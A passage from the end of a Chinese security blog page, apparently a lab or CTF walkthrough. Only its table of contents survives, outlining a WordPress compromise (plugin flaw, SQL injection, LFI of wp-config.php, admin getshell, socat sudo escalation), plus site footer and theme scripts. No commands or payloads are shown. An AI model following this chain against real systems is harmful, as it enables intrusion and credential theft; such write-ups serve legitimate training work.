href="#WordPress-%E7%AB%99%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">1.2.3.</span> <span class="toc-text">WordPress 站点分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WPScan-%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.4.</span> <span class="toc-text">WPScan 扫描结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">插件漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-%E2%80%94-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">SQL 注入 — 获取用户凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-%E2%80%94-%E8%AF%BB%E5%8F%96-wp-config-php"><span class="toc-number">1.3.3.</span> <span class="toc-text">LFI — 读取 wp-config.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress-%E5%90%8E%E5%8F%B0-Getshell"><span class="toc-number">1.3.4.</span> <span class="toc-text">WordPress 后台 Getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">获取用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hint-txt-%E6%8F%90%E7%A4%BA"><span class="toc-number">1.4.1.</span> <span class="toc-text">hint.txt 提示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackathons-%E6%96%87%E4%BB%B6%E7%BA%BF%E7%B4%A2"><span class="toc-number">1.4.2.</span> <span class="toc-text">hackathons 文件线索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">SSH 登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%EF%BC%9Aelyana-%E2%86%92-root"><span class="toc-number">1.6.</span> <span class="toc-text">提权：elyana → root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-%E6%9D%83%E9%99%90"><span class="toc-number">1.6.1.</span> <span class="toc-text">sudo 权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socat-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.</span> <span class="toc-text">socat 提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.7.</span> <span class="toc-text">非预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">攻击路径总结</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
